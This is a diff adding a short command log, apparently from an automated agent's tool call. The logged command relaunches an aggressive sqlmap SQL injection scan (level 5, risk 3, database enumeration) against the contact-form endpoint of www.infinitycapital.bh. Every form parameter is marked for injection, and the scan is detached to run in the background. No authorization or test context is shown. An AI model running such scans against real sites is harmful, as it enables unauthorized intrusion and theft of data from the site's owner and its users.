@@ -1,0 +1,22 @@
+# command: cd /work; ps -eo pid,cmd | grep "api/send" | grep sqlmap | grep -v grep | awk '{print $1}' | xargs -r kill -9 2>/dev/null
+cat > tool_outputs/send_req.txt <<'EOF'
+POST /api/send HTTP/1.1
+Host: www.infinitycapital.bh
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) Firefox/128.0
+Accept: */*
+Accept-Encoding: identity
+Content-Type: application/x-www-form-urlencoded
+Referer: https://www.infinitycapital.bh/contact
+Connection: close
+
+fname=*&lname=*&areacode=*&tel=*&cname=*&subject=*&msg=*&check=*&targets=*
+EOF
+setsid nohup sqlmap -r tool_outputs/send_req.txt --batch --level=5 --risk=3 --dbs --threads=1 --delay=0.5 --timeout=20 --retries=1 --flush-session --output-dir=tool_outputs/sqlmap_send > tool_outputs/sqlmap_send2.log 2>&1 < /dev/null &
+disown
+echo relaunched; head -20 tool_outputs/sqlmap_send2.log
+# tool: ps
+# exit_code: 0
+# ts: 2026-09-30T11:30:32.042468+00:00
+# ---
+
+relaunched
